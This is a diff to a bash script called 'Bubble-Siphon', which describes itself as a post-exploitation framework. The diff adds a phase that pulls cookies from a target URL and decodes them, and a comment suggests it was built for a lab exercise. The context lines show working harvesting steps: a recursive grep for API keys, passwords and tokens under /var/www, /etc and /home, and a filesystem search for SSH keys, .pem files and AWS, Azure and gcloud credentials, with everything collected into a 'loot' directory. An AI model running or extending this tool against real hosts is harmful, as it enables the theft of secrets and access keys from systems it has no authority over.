@@ -1,5 +1,5 @@
 #!/bin/bash
-# Bubble-Siphon v2.0 - Advanced Post-Exploitation Framework
+# Bubble-Siphon v2.1 - Advanced Post-Exploitation Framework
 # Author: Bubble 🫧
 
 # --- Professional UI ---
@@ -16,9 +16,16 @@ echo "  ____        _     _     _      "
 echo " | __ ) _   _| |__ | |__ | | ___ "
 echo " |  _ \| | | | '_ \| '_ \| |/ _ \\"
 echo " | |_) | |_| | |_) | |_) | |  __/"
-echo " |____/ \__,_|_.__/|_.__/|_|\___| SIPHON v2.0"
+echo " |____/ \__,_|_.__/|_.__/|_|\___| SIPHON v2.1"
 echo -e "${NC}"
 
+if [ -z "$1" ]; then
+    echo -e "${RED}[!] Error: Target URL required for Phase 6.${NC}"
+    echo -e "${YELLOW}Usage: ./bubble_siphon.sh <http://target-ip/path>${NC}"
+    # We continue, but skip phase 6 if no URL
+fi
+
+TARGET_URL=$1
 LOOT_DIR=".bubble_loot_$(date +%s)"
 mkdir $LOOT_DIR
 
@@ -55,15 +62,43 @@ echo -e "${CYAN}[*] Phase 3: Mapping Internal Network & Connections...${NC}"
 
 # 4. DEEP SECRET SCAVENGING
 echo -e "${CYAN}[*] Phase 4: Siphoning Configs & API Keys...${NC}"
-# This searches for common web app config files first
 find /var/www /opt /home -name "*.env" -o -name "config*" -o -name ".*_history" 2>/dev/null >"$LOOT_DIR/04_target_files.txt"
-
-# Grep for high-value strings
 grep -riE "api_key|password|db_pass|secret|token|bearer|mongodb|redis" /var/www /etc /home 2>/dev/null | grep -v ".js\|.css" | head -n 1000 > "$LOOT_DIR/04_leaked_secrets.txt"
 
 # 5. SSH & CLOUD ACCESS KEYS
 echo -e "${CYAN}[*] Phase 5: Hunting for Access Keys...${NC}"
 find / -name "id_rsa" -o -name "*.pem" -o -name "*.pub" -o -name "credentials" 2>/dev/null | grep -E ".ssh|.aws|.azure|.gcloud" > "$LOOT_DIR/05_access_keys.txt"
+
+# 6. UNIVERSAL COOKIE SIPHON (New!)
+if [ -n "$TARGET_URL" ]; then
+    echo -e "${CYAN}[*] Phase 6: Universal Cookie Siphon & Decoding...${NC}"
+    {
+        raw_cookies=$(curl -s -I "$TARGET_URL" | grep -i "Set-Cookie")
+        if [ -n "$raw_cookies" ]; then
+            echo "$raw_cookies" | while read -r line; do
+                cookie_pair=$(echo "$line" | awk '{print $2}' | cut -d';' -f1)
+                name=$(echo "$cookie_pair" | cut -d'=' -f1)
+                value=$(echo "$cookie_pair" | cut -d'=' -f2)
+                
+                echo -e "[+] Siphoned: $name=$value"
+                
+                # Decoding Chain: URL -> Base64
+                url_decoded=$(python3 -c "import urllib.parse as ul; print(ul.unquote('$value'))" 2>/dev/null)
+                b64_decoded=$(echo "$url_decoded" | base64 -d 2>/dev/null)
+                
+                if [ -n "$b64_decoded" ]; then
+                    echo "    [!] Decoded (B64): $b64_decoded"
+                    # Match MD5 Hashes (Targeting Lab N7 Admin logic)
+                    if [[ $b64_decoded =~ ^[a-f0-9]{32}$ ]]; then
+                        echo "    [!!!] HASH DETECTED: $b64_decoded"
+                    fi
+                fi
+            done
+        else
+            echo "No cookies found in headers."
+        fi
+    } > "$LOOT_DIR/06_cookies.txt"
+fi
 
 echo -e "------------------------------------"
 echo -e "${GREEN}${BOLD}[+] SIPHON COMPLETE${NC}"
